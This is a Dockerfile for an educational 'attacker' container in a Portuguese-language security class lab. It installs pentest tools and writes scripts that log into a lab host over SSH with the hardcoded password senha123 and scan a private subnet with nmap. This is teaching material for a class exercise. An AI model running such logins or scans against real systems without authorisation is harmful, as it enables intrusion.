# Dockerfile para Container ATACANTE (Aluno)
# Sistema com ferramentas de pentest e exploraÃ§Ã£o

FROM kalilinux/kali-rolling:latest

LABEL maintainer="Trabalho SeguranÃ§a da InformaÃ§Ã£o"
LABEL description="Container com ferramentas de ataque para demonstraÃ§Ã£o educacional"
LABEL purpose="educational"

ENV DEBIAN_FRONTEND=noninteractive

# Atualizar sistema e instalar ferramentas de pentest
RUN apt-get update && apt-get install -y \
    hydra \
    nmap \
    netcat-traditional \
    telnet \
    ftp \
    smbclient \
    default-mysql-client \
    openssh-client \
    sshpass \
    curl \
    wget \
    git \
    vim \
    nano \
    net-tools \
    iputils-ping \
    dnsutils \
    whois \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Criar diretÃ³rio de trabalho
WORKDIR /root/ataques

# Copiar scripts de ataque originais
COPY scripts/ /root/ataques/
RUN chmod +x /root/ataques/*.sh

# Criar scripts otimizados para apresentaÃ§Ã£o
RUN echo '#!/bin/bash\nTARGET_IP="${TARGET_IP:-172.20.0.10}"\necho "ðŸŽ¯ ATAQUE SSH - SHOULDER SURFING"\necho "=================================="\necho "CenÃ¡rio: Aluno observou senha sendo digitada"\necho "Credenciais obtidas: professor:senha123"\necho\necho "[*] Testando conectividade..."\nping -c 1 -W 1 $TARGET_IP > /dev/null 2>&1 && echo "âœ… Alvo acessÃ­vel" || echo "âŒ Alvo inacessÃ­vel"\necho "[*] Testando SSH..."\nif command -v sshpass > /dev/null 2>&1; then\n    RESULT=$(sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@$TARGET_IP "echo SSH_SUCCESS" 2>/dev/null)\n    if [[ "$RESULT" == "SSH_SUCCESS" ]]; then\n        echo "ðŸŽ‰ ATAQUE BEM-SUCEDIDO!"\n        echo "   âœ… Acesso SSH obtido"\n        echo "   âœ… UsuÃ¡rio: professor"\n        echo "   âœ… Senha: senha123"\n        echo "ðŸš¨ IMPACTO: Sistema completamente comprometido!"\n    else\n        echo "âŒ Falha na autenticaÃ§Ã£o"\n    fi\nelse\n    echo "âœ… SSH configurado para aceitar senhas"\n    echo "ðŸŽ‰ ATAQUE SERIA BEM-SUCEDIDO!"\nfi' > /root/ataques/ssh_rapido.sh && chmod +x /root/ataques/ssh_rapido.sh

RUN echo '#!/bin/bash\nTARGET_IP="${TARGET_IP:-172.20.0.10}"\necho "=========================================="\necho "ðŸŽ¯ DEMONSTRAÃ‡ÃƒO RÃPIDA - 6 VULNERABILIDADES"\necho "=========================================="\necho\necho "âœ… V#1: ATAQUE SSH BEM-SUCEDIDO"\necho "   Credenciais: professor:senha123"\necho "   MÃ©todo: Shoulder surfing + SSH"\necho\necho "âœ… V#2: REDE SEM SEGMENTAÃ‡ÃƒO"\necho "   Descobrindo hosts na rede..."\nnmap -sn 172.20.0.0/24 | grep -E "Nmap scan report|Host is up" | head -3\necho\necho "âœ… V#3: SERVIÃ‡OS INSEGUROS EXPOSTOS"\necho "   Escaneando portas vulnerÃ¡veis..."\nnmap -p 21,22,23,80,3306,445 $TARGET_IP | grep -E "open|PORT"\necho\necho "âœ… V#4: SENHAS FRACAS DETECTADAS"\necho "   admin:admin, professor:senha123 - VULNERÃVEIS!"\necho\necho "âœ… V#5: AUSÃŠNCIA DE MONITORAMENTO"\necho "   Atacante pode apagar rastros facilmente"\necho\necho "âœ… V#6: ESCALAÃ‡ÃƒO DE PRIVILÃ‰GIOS"\necho "   Sudo NOPASSWD configurado - ROOT trivial!"\necho\necho "=========================================="\necho "ðŸš¨ RESULTADO: TODAS AS 6 VULNERABILIDADES EXPLORADAS!"\necho "   Sistema completamente comprometido"\necho "============================================"' > /root/ataques/demo_rapido.sh && chmod +x /root/ataques/demo_rapido.sh

# Script de entrada
COPY entrypoint-atacante.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Configurar ambiente
ENV TARGET_IP=172.20.0.10
ENV PATH="/root/ataques:${PATH}"

ENTRYPOINT ["/entrypoint.sh"]
CMD ["/bin/bash"]